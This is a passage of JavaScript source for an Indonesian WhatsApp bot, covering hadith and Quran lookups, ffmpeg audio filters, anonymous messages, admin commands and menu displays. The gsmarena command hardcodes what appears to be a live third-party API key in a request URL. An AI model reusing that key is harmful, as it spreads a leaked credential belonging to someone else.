${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
tirmidzi
1 - 3891
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://fatiharridho.herokuapp.com/api/islamic/hadits?list=${args[0]}`)
		let { number, arab, id } = res.result.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		bluz.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await bluz.downloadAndSaveMediaMessage(qmsg)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                bluz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            //[================================< CASE ANONYMOUS >==========================]
            case 'menfes': case 'confes':
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (Object.values(anon.anonymous).find(p => p.check(sender))) return m.reply("Anda masih didalam room")
                if (m.isGroup) return m.reply(mess.private)
                if (args.length < 1) return m.reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 6281234567890|Hai Crush`)
                if (text > 700) return m.reply(`Teks Kepanjangan`)
                num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
                pesan = q.split('|')[1]
                let cekno = await bluz.onWhatsApp(num)
                if (cekno.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
                if (num === m.sender) return m.reply(`Tidak Bisa Menfess Ke Nomor Sendiri!!!`)
                if (num === botNumber) return m.reply(`Tidak Bisa Menfess Ke Nomor bot!!!`)
                var nomor = m.sender
                let buttons = [
                { buttonId: '.leave', buttonText: { displayText: 'Biarin' }, type: 1 }
                ]
                await bluz.sendButtonText(num, buttons, `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
                Seseorang Temanmu
                (Pengirim Rahasia)
                
                -------------------------------------->
                
                💌 Pesan : ${pesan}
                
                -------------------------------------->`, `PENGIRIM RAHASIA
                Anda Ingin Mengirimkan Pesan Ke Pacar/Sahabat/Teman/Doi/Mantan?
                Tapi Tidak Ingin Tau Siapa Pengirimnya?
                Kamu Bisa Menggunakan Bot Ini
                Contoh Penggunaan: ${prefix+command} nomor|pesan untuknya
                
                Contoh: ${prefix+command} 628xxxxxxxx|hai owner`, m)
                await bluz.sendMessage(num, {text:`𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`}, { quoted : m })
                lidt = `Sukses Mengirim Pesan
                👤 Dari : wa.me/${nomor.split("@s.whatsapp.net")[0]}
                👥 Ke : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}
                
                ⬡──⬡─────────⬡──⬡
                
                Isi Pesan : ${pesan}
                
                ⬡──⬡─────────⬡──⬡`
                var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
                if (!check) {
                anon.createRoom(sender, num)
                console.log("[ MENFES ] Creating room for: " + sender);
                return m.reply(lidt)
                }
                break
                case 'leave':{
                if (m.isGroup && !isCreator && command == "leave") return bluz.groupLeave(from)
                if (m.isGroup) return m.reply("Only private chat")
                var room = Object.values(anon.anonymous).find(p => p.check(sender))
                if (!room) return m.reply("Anda tidak berada didalam room")
                m.reply("Bye...")
                var other = room.other(sender)
                delete anon.anonymous[room.id]
                if (other != "") bluz.sendMessage(other, {
                text: "Bye..."
                })
                if (command == "leave") break;
                }
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            //[================================< CASE OWNER >==========================]
            case 'antiviewonce': case 'antionce':
                //if (isBan) return reply(mess.ban)
//if (isBanChat) return reply(mess.banChat)
if (!m.key.fromMe && !isCreator) return m.reply(mess.owner)
if (args[0] === "on") {
if (global.db.data.chats[m.chat].antionce) return m.reply(`Already activated`)
global.db.data.chats[m.chat].antionce = true
m.reply(`${command} Successfully Activated !`)
} else if (args[0] === "off") {
if (!global.db.data.chats[m.chat].antionce) return m.reply(`Already deactivated`)
global.db.data.chats[m.chat].antionce = false
m.reply(`${command} Successfully Deactivated !`)
} else {
let buttonsntilink = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await bluz.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
}
break
            case 'block': {
                if (!isCreator) throw mess.owner
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
                await bluz.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'unblock': {
                if (!isCreator) throw mess.owner
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
                await bluz.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'pesanbug': {
                //if (isBan) return reply(mess.ban)	 			
                //if (isBanChat) return reply(mess.banChat)
                //Number : @${m.sender.split("@")[0]}
                if (!isCreator) return m.reply(mess.owner)
                if (!args.join(" ")) return reply(`Example :\n${prefix + command} 628916909xxxxxx|Hi`)
                const cpes = args.join(" ")
                const nony = cpes.split("|")[0];
                const pesny = cpes.split("|")[1];
                lolh = `
*| CHAT |*

Message from owner of bot
Number : Privat
Message : *${pesny}*

Untuk Membalas pesan dari owner ketik: 
Report min ytmp3nya error`
                bluz.sendMessage(nony + "@s.whatsapp.net", {text:lolh, mentions:[m.sender]}, {quoted:m})
            }
                await m.reply("Success")
            break
            case 'report': {
                m.reply('#report min ignya error')
                //if (isBan) return reply(mess.ban)	 			
                //if (isBanChat) return reply(mess.banChat)
                if (!args.join(" ")) return m.reply(`Example : \n- ${prefix + command} min ytmp4nya error\n- ${prefix + command} hey dev this user is spamming`)
                teks = `*| REPORT |*`
                teks1 = `\n\nNumber : @${m.sender.split("@")[0]}\nReport : ${args.join(" ")}`
                teks2 = `\n\nSuccessfully sent to owner`
                teks3 = `\n\nuntuk membalas bug report kamu cukup ketik #pesanbug 628|nanti kita fix ignya`
                for (let i of owner) {
                bluz.sendMessage(i + "@s.whatsapp.net", {text: teks + teks1 + teks3, mentions:[m.sender]}, {quoted:m})
                }
                bluz.sendMessage(m.chat, {text: teks + teks2 + teks1, mentions:[m.sender]}, {quoted:m})
             }
             break
            case 'public': {
                if (!isCreator) throw mess.owner
                bluz.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                bluz.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                bluz.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'setexif': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Example : ${prefix + command} packname|author`
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
            case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await bluz.downloadAndSaveMediaMessage(qmsg)
                await bluz.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
            }
            break
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await bluz.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'exit': {
                if (!isCreator) throw mess.owner
                await bluz.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'speedtest': {
                m.reply('Testing Speed...')
                let cp = require('child_process')
                let { promisify } = require('util')
                let exec = promisify(cp.exec).bind(cp)
              let o
              try {
              o = await exec('python speed.py')
              } catch (e) {
              o = e
             } finally {
            let { stdout, stderr } = o
            if (stdout.trim()) m.reply(stdout)
            if (stderr.trim()) m.reply(stderr)
                }
                }
                break
            case 'owner': case 'creator': {
                bluz.sendContact(m.chat, global.owner, m)
            }
            break
            case 'playstore': {
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `⭔ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `⭔ Name : ${i.name}\n`
            teks += `⭔ Link : ${i.link}\n`
            teks += `⭔ Developer : ${i.developer}\n`
            teks += `⭔ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'gsmarena': {
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(`https://api.lolhuman.xyz/api/gsmarena?apikey=@nc0kb4j1n64n&query=${text}`)
            console.log(res)
            let { phone_name, rilis, phone_image, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `⭔ Title: ${phone_name}
⭔ Realease: ${rilis}
⭔ Size: ${ukuran}
⭔ Type: ${type}
⭔ Storage: ${storage}
⭔ Display: ${display}
⭔ Inchi: ${inchi}
⭔ Pixel: ${pixel}
⭔ Video Pixel: ${videoPixel}
⭔ Ram: ${ram}
⭔ Chipset: ${chipset}
⭔ Battery: ${batrai}
⭔ Battery Brand: ${merek_batre}
⭔ Detail: ${detail}`
            bluz.sendImage(m.chat, phone_image, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ Thumbnail: ${i.thumb}\n`
            capt += `⭔ Url: ${i.url}\n\n──────────────────────\n`
            }
            bluz.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ Url: ${i.url}\n`
            capt += `⭔ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            bluz.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Aminio Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Community: ${i.community}\n`
            capt += `⭔ Community Link: ${i.community_link}\n`
            capt += `⭔ Thumbnail: ${i.community_thumb}\n`
            capt += `⭔ Description: ${i.community_desc}\n`
            capt += `⭔ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            bluz.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `⭔ Judul: ${judul}\n`
            capt += `⭔ Dibaca: ${dibaca}\n`
            capt += `⭔ Divote: ${divote}\n`
            capt += `⭔ Bab: ${bab}\n`
            capt += `⭔ Waktu: ${waktu}\n`
            capt += `⭔ Url: ${url}\n`
            capt += `⭔ Deskripsi: ${description}`
            bluz.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⭔ Judul: ${i.judul}\n`
            capt += `⭔ Like: ${i.like}\n`
            capt += `⭔ Creator: ${i.creator}\n`
            capt += `⭔ Genre: ${i.genre}\n`
            capt += `⭔ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            break
            case 'drakor': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⭔ Judul: ${i.judul}\n`
            capt += `⭔ Years: ${i.years}\n`
            capt += `⭔ Genre: ${i.genre}\n`
            capt += `⭔ Url: ${i.url}\n`
            capt += `⭔ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            bluz.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                setbot.templateLocation = false
                m.reply(mess.success)
                } else if (args[0] === 'templateLocation'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                setbot.templateLocation = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`},
                {title: "Template Location", rowId: `setmenu templateLocation`, description: `Change menu bot to Template Location`}
                ]
                },
                ]
                bluz.sendListMsg(m.chat, `Please select the menu you want to change!`, bluz.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break
    case 'allmenu':
var unicorn = await getBuffer(`https://i.ibb.co/GtNJC11/Text-Pro-me-16302fb3b7f3df.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.allmenu(botname, pushname, ucapanWaktu, prefix, runtime), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'convertmenu':
var unicorn = await getBuffer(`https://i.ibb.co/Wgpqrsv/Text-Pro-me-16302fddf797ad.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.convertmenu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'downloadmenu':
var unicorn = await getBuffer(`https://i.ibb.co/NrghnsT/Text-Pro-me-16302fe1c9165e.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.downloadmenu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'gamemenu':
var unicorn = await getBuffer(`https://i.ibb.co/6PXYhQP/Text-Pro-me-163033fc4b1934.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.gamemenu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'grupmenu':
var unicorn = await getBuffer(`https://i.ibb.co/VgxGPW0/Text-Pro-me-16302fd6f15e36.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.grupmenu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'randommenu':
var unicorn = await getBuffer(`https://i.ibb.co/mcvCwwm/Text-Pro-me-1630301075d067.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.randommenu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'searchmenu':
var unicorn = await getBuffer(`https://i.ibb.co/M2dnFzz/Text-Pro-me-16302ffe3012d1.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.searchmenu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'stickermenu':
var unicorn = await getBuffer(`https://i.ibb.co/M25bx8b/Text-Pro-me-16302fc1ad84ee.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.stickermenu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'stickerwibu':
var unicorn = await getBuffer(`https://i.ibb.co/FYB410G/Text-Pro-me-16303006e276b1.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.stickerwibu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
case 'anonymousmenu':
var unicorn = await getBuffer(`https://i.ibb.co/ZB2SNHz/Text-Pro-me-163033c4169836.jpg`)
await bluz.send5ButLoc(from, `` + '' + lang.anonymousmenu(prefix), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "⚠️ Rules","id": 'rules'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
break
//RULES
case 'rules':
var unicorn = await getBuffer('https://images.wallpaperscraft.com/image/single/radiation_sign_warning_192115_1600x900.jpg')
await bluz.send5ButLoc(from, `` + '' + lang.rules(pushname), `BluzBot © Informasi s.id/bluzbot`,unicorn, [{"urlButton": {"displayText": "GropBot 📍","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "Donasi 🔖","url": `https://saweria.co/ceria`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "🧾 Sewa","id": 'sewa'}}] )
break
